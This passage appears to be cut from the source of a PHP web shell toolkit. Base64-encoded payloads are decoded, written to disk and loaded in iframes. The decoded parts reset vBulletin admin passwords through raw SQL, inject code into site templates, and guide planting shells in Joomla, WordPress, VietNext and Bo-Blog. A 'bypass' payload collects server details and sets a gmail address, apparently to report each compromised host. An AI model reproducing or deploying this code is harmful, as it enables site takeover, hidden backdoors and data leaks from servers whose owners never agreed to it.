JaMG9nU0ZaNldsaEtiV0ZYZUd4WU0xSjBZME5CT1VsRFVtWlNhMnhOVWxaT1lrb3liSFJaVjJSc1NqRXhZa296VW5SalJqa2dkVmxYTVd4S01UQTNSRkZ2WjBsRFFXZGhWMWxuUzBkc2VtTXlWakJMUTFKbVVtdHNUVkpXVG1KS01teDBXVmRrYkVvZ01URmlTakkxYUdKWFZXNVlVMnR3U1VoelRrTnBRV2RKUTBGblNVTkJaMHBIUm1saU1sRm5VRk5CYTFwdGJITmFWMUlnY0dOcE5HdGtXRTVzWTIxYWNHSkhWbVppYlVaMFdsUnpUa05wUVdkSlEwRm5TVU5CWjFGSE1YWmtiVlptWkZoQ2MySWdNa1pyV2xkU1pscHRiSE5hVTJkclpGaE9iR050V25CaVIxWm1aRWN4ZDB4RFFXdFpWMHAyV2tOck4wUlJiMmRKUVRBZ1MxcFhUbTlpZVVrNFdUSldkV1JIVm5sUWFuaHBVR3RTZG1KdFZXZFFWREFyU1VOU01XTXlWbmxhYld4eldsWTVkVmtnVnpGc1VFTTVhVkJxZDNaWk1sWjFaRWRXZVZCcFNUZEVVWEE1UkZGd09VUlJjR3hpU0U1c1pYY3dTMXBYVG05aWVXTWdUa05xZUcxaU0wcDBTVWN4YkdSSGFIWmFSREJwVlVVNVZGWkRTV2RaVjA0d1lWYzVkVkJUU1dsSlIxWjFXVE5TTldNZ1IxVTVTVzB4TVdKSVVuQmpSMFo1WkVNNWJXSXpTblJNVjFKb1pFZEZhVkJxZUhCaWJrSXhaRU5DTUdWWVFteFFVMG9nYldGWGVHeEphVUoxV1ZjeGJGQlRTbkJpVjBadVdsTkpLMUJIYkhWalNGWXdTVWhTTldOSFZUbEpiRTR4V1cweGNHUWdRMGxuWW0xR2RGcFVNR2xWTTFacFlsZHNNRWxwUWpKWlYzZ3hXbFF3YVZVelZtbGlWMnd3U1dvME9Fd3lXblpqYlRBZ0swcDZjMDVEYmpBOUlpa3BmWDE3Skh0bGVHbDBLQ2w5ZlNZS0pGOXdhSEJwYm1Oc2RXUmxYMjkxZEhCMWREd3ZkR1Y0ZEdGeVpXRStQR0p5UGdvOGFXNXdkWFFnZEhsd1pUMXpkV0p0YVhRZ2RtRnNkV1U5SjBOb1lXNW5aU2NnUGp4aWNqNEtQQzltYjNKdFBqd3ZZMlZ1ZEdWeVBnbzhMMmgwYld3K0Nqdy9DbVZ5Y205eVgzSmxjRzl5ZEdsdVp5Z3dLVHNLSkdodmMzUnVZVzFsSUQwZ0pGOVFUMU5VV3lkb2IzTjBibUZ0WlNkZE93b2taR0p1WVcxbElEMGdKRjlRVDFOVVd5ZGtZbTVoYldVblhUc0tKR1JpZFhObGNpQTlJQ1JmVUU5VFZGc25aR0oxYzJWeUoxMDdDaVJrWW5CaGMzTWdQU0FrWDFCUFUxUmJKMlJpY0dGemN5ZGRPd29rZFhObGNqMXpkSEpmY21Wd2JHRmpaU2dpWENjaUxDSW5JaXdrZFhObGNpazdDaVJ6WlhSZmRYTmxjaUE5SUNSZlVFOVRWRnNuZFhObGNpZGRPd29rY0dGemN6MXpkSEpmY21Wd2JHRmpaU2dpWENjaUxDSW5JaXdrY0dGemN5azdDaVJ6WlhSZmNHRnpjeUE5SUNSZlVFOVRWRnNuY0dGemN5ZGRPd29rWlcxaGFXdzljM1J5WDNKbGNHeGhZMlVvSWx3bklpd2lKeUlzSkdWdFlXbHNLVHNLSkhObGRGOWxiV0ZwYkNBOUlDUmZVRTlUVkZzblpXMWhhV3duWFRzS0pIWmlYM0J5WldacGVDQTlJQ1JmVUU5VFZGc25jSEpsWm1sNEoxMDdDaVJrWVhSaElEMGdKRjlRVDFOVVd5ZGtZWFJoSjEwN0NpUnpaWFJmWkdGMFlTQXVQU0FvSWlSa1lYUmhJaWs3Q2lSMFlXSnNaVjl1WVcxbElEMGdKSFppWDNCeVpXWnBlQzRpZFhObGNpSTdDaVIwWVdKc1pWOXVZVzFsTWlBOUlDUjJZbDl3Y21WbWFYZ3VJblJsYlhCc1lYUmxJanNLQ2tCdGVYTnhiRjlqYjI1dVpXTjBLQ1JvYjNOMGJtRnRaU3drWkdKMWMyVnlMQ1JrWW5CaGMzTXBPd3BBYlhsemNXeGZjMlZzWldOMFgyUmlLQ1JrWW01aGJXVXBPd29LSkhGMVpYSjVJRDBnSjNObGJHVmpkQ0FxSUdaeWIyMGdKeUF1SUNSMFlXSnNaVjl1WVcxbElDNGdKeUIzYUdWeVpTQjFjMlZ5Ym1GdFpUMGlKeUF1SUNSelpYUmZkWE5sY2lBdUlDY2lPeWM3Q2lSeVpYTjFiSFFnUFNCdGVYTnhiRjl4ZFdWeWVTZ2tjWFZsY25rcE93b2tjbTkzSUQwZ2JYbHpjV3hmWm1WMFkyaGZZWEp5WVhrb0pISmxjM1ZzZENrN0NpUnpZV3gwSUQwZ0pISnZkMXNuYzJGc2RDZGRPd29rY0dGemN6RWdQU0J0WkRVb0pITmxkRjl3WVhOektUc0tKSEJoYzNNeUlEMGdiV1ExS0NSd1lYTnpNU0F1SUNSellXeDBLVHNLQ2lSeGRXVnljbmt4SUQwZ0oxVlFSRUZVUlNBbklDNGdKSFJoWW14bFgyNWhiV1VnTGlBbklGTkZWQ0J3WVhOemQyOXlaRDBpSnlBdUlDUndZWE56TWlBdUlDY2lJRmRJUlZKRklIVnpaWEp1WVcxbFBTSW5JQzRnSkhObGRGOTFjMlZ5SUM0Z0p5STdKenNLSkhGMVpYSnllVElnUFNBblZWQkVRVlJGSUNjZ0xpQWtkR0ZpYkdWZmJtRnRaU0F1SUNjZ1UwVlVJR1Z0WVdsc1BTSW5JQzRnSkhObGRGOWxiV0ZwYkNBdUlDY2lJRmRJUlZKRklIVnpaWEp1WVcxbFBTSW5JQzRnSkhObGRGOTFjMlZ5SUM0Z0p5STdKenNLSkhGMVpYSnllVE1nUFNBblZWQkVRVlJGSUNjZ0xpQWtkR0ZpYkdWZmJtRnRaVElnTGlBbklGTkZWQ0IwWlcxd2JHRjBaU0E5SWljZ0xpQWtjMlYwWDJSaGRHRWdMaUFuSWlCWFNFVlNSU0IwYVhSc1pTQTlJQ0ptWVhFaU95YzdDZ29rYjJzeFBVQnRlWE54YkY5eGRXVnllU2drY1hWbGNuSjVNU2s3Q2lSdmF6RTlRRzE1YzNGc1gzRjFaWEo1S0NSeGRXVnljbmt5S1RzS0pHOXJNVDFBYlhsemNXeGZjWFZsY25rb0pIRjFaWEp5ZVRNcE93b0thV1lvSkc5ck1TbDdDbVZqYUc4Z0lqeHpZM0pwY0hRK1lXeGxjblFvSjNaQ2RXeHNaWFJwYmlCcGJtWnZJR05vWVc1blpXUWdZVzVrSUZOb1pXeHNJR0YyWVdsc1lXSnNaU0JwY3lCbVlYRXVjR2h3SURvcEp5azdQQzl6WTNKcGNIUStJanNLZlFvL1BpQT0KJzsKCiRmaWxlID0gZm9wZW4oInZiYi5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL3ZiYi5waHAgd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOwp9CgppZiAoaXNzZXQoJF9QT1NUWydqbCddKSkKewogICAgbWtkaXIoJ3Vwc2hlbGwnLCAwNzU1KTsKICAgIGNoZGlyKCd1cHNoZWxsJyk7CiRjb25maWdzaGVsbCA9ICdQR2gwYld3K1BHaGxZV1ErQ2dvOGJXVjBZU0JvZEhSd0xXVnhkV2wyUFNKRGIyNTBaVzUwTFZSNWNHVWlJR052Ym5SbGJuUTlJblJsZUhRdmFIUnRiRHNnWTJoaGNuTmxkRDExZEdZdE9DSStDZ29LUEdJK1BITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajQ4YzNCaGJpQnpkSGxzWlQwaVkyOXNiM0k2SUdKc2RXVTdJajVEdzZGamFDQXhJRG9nUEM5emNHRnVQanhpY2lBdlBncGZURzloWkNBdllXUnRhVzVwYzNSeVlYUnZjaUFtWjNRN0lFZHNiMkpoYkNCRGIyNW1hV2QxY21GMGFXOXVJQ1puZERzZ1UzbHpkR1Z5YlNBbVozUTdJRTFsWkdsaElGTmxkSFJwYm1jZ0ptZDBPeUIwYU1PcWJTREVrZUc3aTI1b0lHVGh1cUZ1WnlBOGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklISmxaRHNpUGk1d2FIQThMM053WVc0K1BHSnlJQzgrQ2w5VFlYVWd4SkhEc3lCMnc2QnZJRTFsWkdsaElFMWhibUZuWlhJZ2RYQWdQSE53WVc0Z2MzUjViR1U5SW1OdmJHOXlPaUJ5WldRN0lqNXphR1ZzYkM1d2FIQThMM053WVc0K1BHSnlJQzgrQ2w5RGFPRzZvWGtnYzJobGJHdzZJRHhoSUdoeVpXWTlJbWgwZEhBNkx5OTJhV04wYVcwdmFXMWhaMlZ6TDNOb1pXeHNMbkJvY0NJZ2RHRnlaMlYwUFNKZllteGhibXNpUG1oMGRIQTZMeTkyYVdOMGFXMHZhVzFoWjJWekwzTm9aV3hzTG5Cb2NEd3ZZVDRtYm1KemNEczhMM053WVc0K1BDOWlQanhpY2lBdlBnbzhZbklnTHo0S1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQmliSFZsT3lJK1BHSStQSE53WVc0Z2MzUjViR1U5SW1admJuUXRjMmw2WlRvZ2JHRnlaMlU3SWo1RHc2RmphQ0E4YzNCaGJpQnpkSGxzWlQwaVptOXVkQzF6YVhwbE9pQnNZWEpuWlRzaVBqSThMM053WVc0K0lEcEZaR2wwSUhSbGJYQThjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lCc1lYSm5aVHNpUG14bFBDOXpjR0Z1UGlCS2IyMXNZU1p1WW5Od096d3ZjM0JoYmo0OEwySStQQzl6Y0dGdVBqeGljaUF2UGdvOFlqNDhjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lCc1lYSm5aVHNpUGtOb3c3cHVaeUIwWVNCMnc2QnZJSEJvNGJxbmJpQjBaVzF3YkdGMFpTQWdKbWQwT3lCbFpHbDBJR1BEb1drZ1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQnlaV1E3SWo1cGJtUmxlQzV3YUhBOEwzTndZVzQrSURFZ1l6eHpjR0Z1SUhOMGVXeGxQU0ptYjI1MExYTnBlbVU2SUd4aGNtZGxPeUkrdzZGcElEd3ZjM0JoYmo1MFpXMXdiR0YwWlNCaVBITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajdodXFWMElHczhjM0JoYmlCemRIbHNaVDBpWm05dWRDMXphWHBsT2lCc1lYSm5aVHNpUHNPc0lDMG1aM1E3SUhOaGRtVThMM053WVc0K1BDOXpjR0Z1UGp3dmMzQmhiajQ4TDJJK1BHSnlJQzgrQ2p4aWNpQXZQZ284WWo0OGMzQmhiaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPaUJzWVhKblpUc2lQanh6Y0dGdUlITjBlV3hsUFNKbWIyNTBMWE5wZW1VNklHeGhjbWRsT3lJK1BITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajVqYUR4emNHRnVJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJR3hoY21kbE95SSs0YnFoZVNCemFHVnNiQ0IyUEhOd1lXNGdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2diR0Z5WjJVN0lqN2h1NXRwSUR4emNHRnVJSE4wZVd4bFBTSm1iMjUwTFhOcGVtVTZJR3hoY21kbE95SStjR0YwYUNCMFBITndZVzRnYzNSNWJHVTlJbVp2Ym5RdGMybDZaVG9nYkdGeVoyVTdJajdodTV0cElEeHpjR0Z1SUhOMGVXeGxQU0pqYjJ4dmNqb2djbVZrT3lJK2FXNWtaWGd1Y0dod1BDOXpjR0Z1UGlBOGMzQmhiaUJ6ZEhsc1pUMGlabTl1ZEMxemFYcGxPaUJzWVhKblpUc2lQc1NSUEhOd1lXNGdjM1I1YkdVOUltWnZiblF0YzJsNlpUb2diR0Z5WjJVN0lqN0Rzend2YzNCaGJqNDhMM053WVc0K1BDOXpjR0Z1UGp3dmMzQmhiajQ4TDNOd1lXNCtQQzl6Y0dGdVBpQThMM053WVc0K1BDOXpjR0Z1UGp3dmMzQmhiajQ4TDJJK1BHSnlJQzgrQ2p3dmFIUnRiRDQ9Cic7CgokZmlsZSA9IGZvcGVuKCJqbC5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL2psLnBocCB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KaWYgKGlzc2V0KCRfUE9TVFsnd3AnXSkpCnsKICAgIG1rZGlyKCd1cHNoZWxsJywgMDc1NSk7CiAgICBjaGRpcigndXBzaGVsbCcpOwokY29uZmlnc2hlbGwgPSAnUEhOd1lXNGdjM1I1YkdVOUltTnZiRzl5T2lCaWJIVmxPeUkrUEM5emNHRnVQZ29LUEdJK1E4T2hZMmdnTVNBNlBDOWlQanh6Y0dGdUlITjBlV3hsUFNKamIyeHZjam9nWW14MVpUc2lQanhpUGxCTVZVZEpUbE04TDJJK1BDOXpjR0Z1UGp4aWNpQXZQZ284WWo0bWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNnS3lBaVFVUkVJRTVGVnlCUVRGVkhTVTRpUEM5aVBqeGljaUF2UGdvOFlqNG1ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzZ0t5WnVZbk53T3lBaVZWQk1UMEZFSWlBOGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklISmxaRHNpUGtNNU9TNWFTVkE4TDNOd1lXNCtQQzlpUGp4aWNpQXZQZ284WWo0bWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNnS3lBOGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklISmxaRHNpUGk5M2NDMWpiMjUwWlc1MEwzQnNkV2RwYm5Ndll6azVMMk01T1M1d2FIQThMM053WVc0K1BDOWlQanhpY2lBdlBnbzhZbklnTHo0S1BHSStROE9oWTJnZ01pQTZJRVZrYVhRZ01TQndiSFZuYVc0Z1l1RzZwWFFnYThPc0lDZ2dQSE53WVc0Z2MzUjViR1U5SW1OdmJHOXlPaUJ5WldRN0lqNWhhMmx6YldWMElDazhMM053WVc0K1BDOWlQanhpY2lBdlBnbzhjM0JoYmlCemRIbHNaVDBpWTI5c2IzSTZJQ015TnpSbE1UTTdJajQ4WWo0bWJtSnpjRHRMYUdrZ1kyOXdlU0JqYjJSbElHTnZiaUJ6YUdWc2JDQjJ3NkJ2SUhSb3c2d2djMkYyWlNCaTRidUxJR3podTVkcEptNWljM0E3SUNabmREc21aM1E3SUhacDRicS9kQ0JpNGJxdGVTQmk0YnFoSUhiRG9HOGdLR0Z6WkdGelpHRnpaSE1wSUNabmREc21aM1E3SUhOaGRtVWdiMnNtYm1KemNEc2dKbWQwT3labmREc2dZMjl3ZVNCdHc2TWdibWQxNGJ1VGJpQmpiMjRnYzJobGJHd2dKbWQwT3labmREc2djMkYyWlNCdmF5Qm80YnEvZENCczRidVhhVHd2WWo0OEwzTndZVzQrUEdKeUlDOCtDanhpUGp4emNHRnVJSE4wZVd4bFBTSmpiMnh2Y2pvZ2NtVmtPeUkrUEhOd1lXNGdjM1I1YkdVOUltTnZiRzl5T2lCaWJHRmphenNpUGladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3lBclBDOXpjR0Z1UGp4emNHRnVJSE4wZVd4bFBTSmpiMnh2Y2pvZ0l6STNOR1V4TXpzaVBpQThMM053WVc0K0wzZHdMV052Ym5SbGJuUXZjR3gxWjJsdWN5OWhhMmx6YldWMEwyRnJhWE50WlhRdWNHaHdJRHd2YzNCaGJqNDhMMkkrCic7CgokZmlsZSA9IGZvcGVuKCJ3cC5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL3dwLnBocCB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KaWYgKGlzc2V0KCRfUE9TVFsndm4nXSkpCnsKICAgIG1rZGlyKCd1cHNoZWxsJywgMDc1NSk7CiAgICBjaGRpcigndXBzaGVsbCcpOwokY29uZmlnc2hlbGwgPSAnUEdoMGJXdytQR2hsWVdRK0NnbzhiV1YwWVNCb2RIUndMV1Z4ZFdsMlBTSkRiMjUwWlc1MExWUjVjR1VpSUdOdmJuUmxiblE5SW5SbGVIUXZhSFJ0YkRzZ1kyaGhjbk5sZEQxMWRHWXRPQ0krQ2dvS1BITndZVzRnYzNSNWJHVTlJbU52Ykc5eU9pQmliSFZsT3lJK1BHSStWbWxsZEU1bGVIUWdLRTVWUzBVZ015QXBPand2WWo0OEwzTndZVzQrUEdKeUlDOCtDanhpUGp4aWNpQXZQand2WWo0S1BHSStSRTlYVGt4UFFVUWdNU0JEdzRGSklGUkZUVkJNUlNCRDRidW1RU0JPVlV0RklDMG1aM1E3UEM5aVBqeGljaUF2UGdvOFlqNHRKbWQwT3lCRlJFbFVJRU5QUkVVZ01TQlVVazlPUnlCRHc0RkRJRVpKVEVVZ3hKRERreUF0Sm1kME95QkRTTU9JVGlBOGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklISmxaRHNpUGtOUFJFVWdVMGhGVEV3OEwzTndZVzQrSUZiRGdFOG1ibUp6Y0RzOEwySStQR0p5SUM4K0NqeGlQaTBtWjNRN0lGcEpVQ0JNNGJxZ1NUd3ZZajQ4WW5JZ0x6NEtQR0krTFNabmREc2dWVkFnVkVWTlVFeEZQQzlpUGp4aWNpQXZQZ284WWo0dEptZDBPeUJUUlZSVlVEd3ZZajQ4WW5JZ0x6NEtQR0krTFNabmREc2dWTU9NVFNCUVFWUklJRk5JUlV4TVBDOWlQanhpY2lBdlBnbzhZajQ4YzNCaGJpQnpkSGxzWlQwaVkyOXNiM0k2SUhKbFpEc2lQanhpY2lBdlBqd3ZjM0JoYmo0OEwySStDanhpY2lBdlBnbzhMMmgwYld3KwonOwoKJGZpbGUgPSBmb3Blbigidm4ucGhwIiAsIncrIik7CiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGNvbmZpZ3NoZWxsKSk7CmZjbG9zZSgkZmlsZSk7CiAgICBjaG1vZCgiYmIucGhwIiwwNzU1KTsKICAgZWNobyAiPGlmcmFtZSBzcmM9dXBzaGVsbC92bi5waHAgd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJSBmcmFtZWJvcmRlcj0wPjwvaWZyYW1lPiAiOwp9CmlmIChpc3NldCgkX1BPU1RbJ2JiJ10pKQp7CiAgICBta2RpcigndXBzaGVsbCcsIDA3NTUpOwogICAgY2hkaXIoJ3Vwc2hlbGwnKTsKJGNvbmZpZ3NoZWxsID0gJ1BHaDBiV3crUEdobFlXUStDZ284YldWMFlTQm9kSFJ3TFdWeGRXbDJQU0pEYjI1MFpXNTBMVlI1Y0dVaUlHTnZiblJsYm5ROUluUmxlSFF2YUhSdGJEc2dZMmhoY25ObGREMTFkR1l0T0NJK0Nnb0tQR0krUEhOd1lXNGdjM1I1YkdVOUltTnZiRzl5T2lCeVpXUTdJajVSVmVHNm9rNGdUTU9kSUZWVFJWSXRKbWQwT3lBOEwzTndZVzQrUEdKeUlDOCtKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdJQ3NnSWxGVldlRzdnRTRnVk9HNm9ra2dUTU9LVGlBaVBHSnlJQzgrSm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3Sm01aWMzQTdKbTVpYzNBN0ptNWljM0E3SUNzZ0lrTklUeUJRU01PSlVDREVrRlhEbEVrZ1RlRzduaUJTNGJ1WVRrY2dJanhpY2lBdlBpWnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeUFySUZSSXc0cE5JTVNRNGJ1S1RrZ2dST0c2b0U1SElDSWdVRWhRSUNJOFluSWdMejQ4WW5JZ0x6NDhjM0JoYmlCemRIbHNaVDBpWTI5c2IzSTZJSEpsWkRzaVBsRlY0YnFpVGlCTXc1MGdRc09BU1NCV1NlRzZ2bFF0Sm1kME96d3ZjM0JoYmo0OFluSWdMejRtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNtYm1KemNEc21ibUp6Y0RzbWJtSnpjRHNnS3lBaVVWWGh1cUpPSUV6RG5TQlVTZUc3aGxBZ1ZFbE9JRlRodXFKSklFekRpazRnSWp4aWNpQXZQaVp1WW5Od095WnVZbk53T3ladVluTndPeVp1WW5Od095WnVZbk53T3ladVluTndPeUFySUZWUVRFOUJSRHhpY2lBdlBqeGljaUF2UGp4emNHRnVJSE4wZVd4bFBTSmpiMnh2Y2pvZ2NtVmtPeUkrUTFORVRDQXRKbWQwT3lCTldWTlJURHd2YzNCaGJqNDhZbklnTHo0OGMzQmhiaUJ6ZEhsc1pUMGlZMjlzYjNJNklHSnNkV1U3SWo1elpXeGxZM1FnS2lCbWNtOXRJR0p2WW14dloxOTFjR3h2WVdROEwzTndZVzQrUEM5aVBqeGljaUF2UGdvOFlqNDhZbklnTHo1VXc0eE5JRk5JUlV4TUxsQklVRHd2WWo0OFluSWdMejRLUEdJK1BHSnlJQzgrUEhOd1lXNGdjM1I1YkdVOUltTnZiRzl5T2lCaWJIVmxPeUkrSm01aWMzQTdMMkYwZEdGamFHMWxiblF2ZUhoNGVIaDRlSE5vWld4c0xuQm9jRHd2YzNCaGJqNDhMMkkrQ2p3dmFIUnRiRDQ9Cic7CgokZmlsZSA9IGZvcGVuKCJiYi5waHAiICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJiYi5waHAiLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz11cHNoZWxsL2JiLnBocCB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KPz4KCgogIDx0cj4KICAgIDx0ZD48dGFibGUgd2lkdGg9JzEwMCUnIGhlaWdodD0nMTczJz4KICAgICAgPHRyPgogICAgICAgIDx0aCBjbGFzcz0ndGQnIHN0eWxlPSdib3JkZXItYm90dG9tLXdpZHRoOnRoaW47Ym9yZGVyLXRvcC13aWR0aDp0aGluJz48ZGl2IGFsaWduPSdyaWdodCc+PHNwYW4gY2xhc3M9J3N0eWxlMSc+U09VUkNFICAgOjwvc3Bhbj48L2Rpdj48L3RoPgogICAgICAgIDx0ZCBjbGFzcz0ndGQnIHN0eWxlPSdib3JkZXItYm90dG9tLXdpZHRoOnRoaW47Ym9yZGVyLXRvcC13aWR0aDp0aGluJz48Zm9ybSBuYW1lPSdGMScgbWV0aG9kPSdwb3N0Jz4KICAgICAgICAgICAgPGRpdiBhbGlnbj0nbGVmdCc+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndmJiJyAgdmFsdWU9J1ZCQic+CgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0namwnICB2YWx1ZT0nSm9tTGEnPgoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3dwJyAgdmFsdWU9J1dvcmRQcmVzcyc+CgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndm4nICB2YWx1ZT0nVmlldE5leHQnPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2JiJyAgdmFsdWU9J0JvLUJsb2cnPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Zvcm0+PC90ZD4KICAgICAgPC90cj4KICAgPHRyPgogICAKPC9ib2R5Pgo8L2h0bWw+
    ';
        $file       = fopen("upshell.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=upshell.php width=100% height=720px frameborder=0></iframe> ";
    } elseif ($action == 'bypass') {
        $file       = fopen($dir . "bypass.php", "w+");
        $perltoolss = 'PCFET0NUWVBFIEhUTUwgUFVCTElDICctLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTicgJ2h0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCc+DQo8aHRtbD4NCjwhLS1JdHMgRmlyc3QgUHVibGljIFZlcnNpb24gDQoNCiAtLT4NCjwvaHRtbD4NCjxodG1sPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSdDb250ZW50LVR5cGUnIGNvbnRlbnQ9J3RleHQvaHRtbDsgY2hhcnNldD11dGYtOCc+DQo8dGl0bGU+OjogQnlQYXNzIDo6IEt5bUxqbmsgOjo8L3RpdGxlPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmEgeyANCnRleHQtZGVjb3JhdGlvbjpub25lOw0KY29sb3I6d2hpdGU7DQogfQ0KPC9zdHlsZT4gDQo8c3R5bGU+DQppbnB1dCB7IA0KY29sb3I6IzAwMDAzNTsgDQpmb250OjhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjsNCn0NCi5ESVIgeyANCmNvbG9yOiMwMDAwMzU7IA0KZm9udDpib2xkIDhwdCAndHJlYnVjaGV0IG1zJyxoZWx2ZXRpY2Esc2Fucy1zZXJpZjtjb2xvcjojRkZGRkZGOw0KYmFja2dyb3VuZC1jb2xvcjojQUEwMDAwOw0KYm9yZGVyLXN0eWxlOm5vbmU7DQp9DQoudHh0IHsgDQpjb2xvcjojMkEwMDAwOyANCmZvbnQ6Ym9sZCAgOHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmOw0KfSANCmJvZHksIHRhYmxlLCBzZWxlY3QsIG9wdGlvbiwgLmluZm8NCnsNCmZvbnQ6Ym9sZCAgOHB0ICd0cmVidWNoZXQgbXMnLGhlbHZldGljYSxzYW5zLXNlcmlmOw0KfQ0KYm9keSB7DQoJYmFja2dyb3VuZC1jb2xvcjogI0U1RTVFNTsNCn0NCi5zdHlsZTEge2NvbG9yOiAjQUEwMDAwfQ0KLnRkDQp7DQpib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2Ow0KYm9yZGVyLXRvcDogMHB4Ow0KYm9yZGVyLWxlZnQ6IDBweDsNCmJvcmRlci1yaWdodDogMHB4Ow0KfQ0KLnRkVVANCnsNCmJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7DQpib3JkZXItdG9wOiAxcHg7DQpib3JkZXItbGVmdDogMHB4Ow0KYm9yZGVyLXJpZ2h0OiAwcHg7DQpib3JkZXItYm90dG9tOiAxcHg7DQp9DQouc3R5bGU0IHtjb2xvcjogI0ZGRkZGRjsgfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPD9waHANCiR0aW1lX3NoZWxsICAgICA9ICIiIC4gZGF0ZSgiZC9tL1kgLSBIOmk6cyIpIC4gIiI7DQogICAgICAgICAgICAkaXBfcmVtb3RlICAgICAgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgICAgICAgICAgICRmcm9tX3NoZWxsY29kZSA9ICdzaGVsbEAnIC4gZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkgLiAnJzsNCiAgICAgICAgICAgICR0b19lbWFpbCAgICAgICA9ICdqb2huMjRoMUBnbWFpbC5jb20nOw0KCQkJLy8NCiAgICAgICAgICAgICRzZXJ2ZXJfbWFpbCAgICA9ICIiIC4gZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkgLiAiICAtICIgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10gLiAiIjsNCiAgICAgICAgICAgICRsaW5rY3I